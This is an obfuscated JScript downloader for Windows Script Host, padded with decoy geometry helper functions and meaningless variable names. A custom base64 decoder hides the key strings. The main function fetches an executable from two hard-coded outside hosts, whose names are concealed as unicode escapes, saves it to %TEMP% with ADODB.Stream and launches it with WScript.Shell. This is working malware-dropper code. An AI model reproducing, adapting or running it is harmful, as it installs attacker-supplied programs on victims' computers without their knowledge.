var heirloom = 0;
steak = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  precedence = [];
var incomplete = {
    ':': '.',
    'U': 'S',
	'|': 'X'
	};
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
function extend() {
    var target = arguments[0] || {}, o, p;

    for (var i = 1, len = arguments.length; i < len; i++) {
        o = arguments[i];

        if (!isObject(o)) continue;

        for (p in o) {
            target[p] = o[p];
        }
    }

    return target;
}

function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
String.prototype.alimentary = function () {
	extraction = this;
	for (var i in incomplete){extraction = extraction.replace(i, incomplete[i]);}
    return extraction;
};
  for ( var i = 128; i--; ) {
    if ( precedence[ i ] === undefined )
      precedence[ i ] = -1;
  
    precedence[ steak.charCodeAt( i ) ] = i;
  }
var additional = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.alimentary4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("wellington").join("");
    len = str.length;
    i = 0;
    out = "";
    while(i < len) {
	do {
	    c1 = precedence[str.charCodeAt(i++) & 0xff];
	} while(i < len && c1 == -1);
	if(c1 == -1)
	    break;
	do {
	    c2 = precedence[str.charCodeAt(i++) & 0xff];
	} while(i < len && c2 == -1);
	if(c2 == -1)
	    break;

	out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

	do {
	    c3 = str.charCodeAt(i++) & 0xff;
	    if(c3 == 61)
		return out;
	    c3 = precedence[c3];
	} while(i < len && c3 == -1);
	if(c3 == -1)
	    break;

	out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

	do {
	    c4 = str.charCodeAt(i++) & 0xff;
	    if(c4 == 61)
		return out;
	    c4 = precedence[c4];
	} while(i < len && c4 == -1);
	if(c4 == -1)
	    break;
	out += String.fromCharCode(((c3 & 0x03) << 6) | c4);
    }
    return out;
}

Point.distance = function(p1, p2) {
    var a = p1.x - p2.x;
    var b = p1.y - p2.y;
    return Math.sqrt(a * a + b * b);
};
Point.dot = function(p1, p2) {
    return p1.x * p2.x + p1.y * p2.y;
};

Point.cross = function(p1, p2) {
    return p1.x * p2.y - p1.y * p2.x;
};

var scrip ="wellingtonJVwellingtonRFTVwellingtonAl".alimentary4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var families = "wellingtonQWwellingtonN0aXZwellingtonlWE9iawellingtonmVjdA=wellington=".alimentary4();
String.prototype.alimentary2 = function () {
    var polynesia = {
        downtown: this
    };
    polynesia.extort = polynesia.downtown["c3Vic3RyaW5n".alimentary4()](heirloom, additional);
    return polynesia.extort;
};

var increasingly ="wellingtonRXhwYW5wellingtonkRW52aXwellingtonJvbm1lbnRTdHJwellingtonpbmdz".alimentary4();
var Native = function(options){
	
};
var clime = [families, increasingly,scrip,  ""+"."+("rheumatism","services","consult","newton","skills","augmentation","genome","genre","exe"), "UnVu".alimentary4(), ("M"+"SX"+"ML"+("armature","dregs","protoplasm","gushing","taken","portent","celerity","2.")+"|M"+"LH"+"TT"+("crucifixion","trumpery","infuse","inquire","froth","mozambique","moonshine","monster","P>")+"WU"+("impediment","temporary","projection","sociology","urban","dominant","manager","cr")+("debates","makes","narrate","pedal","trainer","desultory","permissible","economic","ip")+"t:"+("infringe","rubicon","daughters","dictation","clive","cavil","agitator","loving","Sh")+"ell").alimentary()];
athletics = "_F2_";
var chapter = this[clime.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
nSDSkJoyCP = "QfgrPHfx";
ensure = (("dedicate", "behaviour", "smashing", "durance", "missions", "agitating", "carrier", "pRnvSOF") + "vHEsjdxvQto").alimentary2();
precipitation = (("antibody", "notify", "glazed", "camden", "presentday", "hunch", "bandit", "powerseller", "adjustment", "sbgvYWFn") + "JfKJRkq").alimentary2();
  
    String.prototype.fairfield = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var whaler = clime.pop().split(">");

platter = "b3Blbg==".alimentary4();
var marines = new chapter(whaler[1]);
axJeDMRPWxk = "_F3_";
var hallow = new chapter(whaler[0]);
var covered = marines[clime.shift()](clime.shift());
MFWAxq = "_F5_";
weasel = (("impaled", "contemporary", "chemistry", "separated", "EGKAvtVwawo") + "nAvmqVUz").alimentary2();

var hills = clime.shift();
var unprecedented = clime.shift();
function tolerate(collections, swamped) {

    try {
        var optimum = covered + "/" + swamped ;
		optimum = optimum+ hills;
            hallow[platter](("renegade","ammonia","G" + weasel) + ("limiting","smaller","despot","relent","T"), collections, false);
       
    LDvsIjEonEb = "_F7_";
    hallow[precipitation + ("precipitation","wouldbe","end")]();
	var fears=(WScript+"ensure"=="V2luZG93cyBTY3JpcHQgSG9zdA==".alimentary4()+"ensure")&&hallow["c3RhdHVz".alimentary4()] +""=="MjAw".alimentary4()&&typeof(uzCYEoqU)==="undefined";
	lQHNgR = "_F8_";
    if (fears) {
		
        var nebulous = new chapter((("counteract","inspiration","warble","photographer","water","disembark","scapegrace","disapprove","A")+("moiety","doggerel","granary","inequality","propagation","impertinence","placing","funky","SEOO")+"DB"+("furtherance","emblematic","piston","terminating","crunch","scene","apple",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        nebulous[platter]();
        qwLawDhzBS = "_F9_";
        nebulous.type = additional;
        Wlbcoh = "_F10_";
        nebulous["d3JpdGU=".alimentary4()](hallow[("services","conversations","cocks","slander","giggling","burrows","mention","")+"R"+"es"+"pon"+incomplete['U'].toLowerCase()+"e"+"Qm9keQ==".alimentary4()]);
        jriLRmWRbR = "_F11_";
        nebulous[(ensure + "o"+("humanitarian","receives","wellbred","senators","awesome","furnished","wordpress","sheets","00")+("oblivious","similarly","wholl","carried","centers","database","celebrity","8i")+"tion").replace("0"+("shipments","stuff","laggard","dower","monitored","warble","condos","08"), precipitation)] = 0;
        LHDDkvh = "_F12_";
        nebulous[("mayor","liabilities","fabled","indubitable","coincide","scowl","origins","s")+"aveT"+"oF"+"ile"](optimum, 2);
        smFwNLKXCj = "_F13_";
        nebulous.close();
        zJwBgDFD = "_F14_";
		marines[unprecedented](optimum, additional, true);
    }
} catch (ycDBplPly) { };

    aFUENzCT = "_F15_";
}
try{
tolerate("aHR0cDovLw==".alimentary4()+"\u006C\u0069\u0074\u0074\u006C\u0065\u0073\u006F\u0075\u006E\u0064\u0064\u006A"+"\u002E\u0063\u006F\u006D\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?ahnuICrC=fwaEQCk","IdhBVyz");}catch(iREfHcD){}

tolerate("aHR0cDovLw==".alimentary4()+"\u0062\u006C\u006F\u0067\u002E\u0072\u006F\u0074\u0061\u0070\u006F\u0073\u0074"+"\u002E\u0072\u0075\u002F\u006B\u006A\u0067\u0037\u0036\u0036\u0035\u0064\u0066" + "?mDxkGTYWIA=bsvOst","QzMQdHNl");
   KMxFdSpsm = "_F16_";
   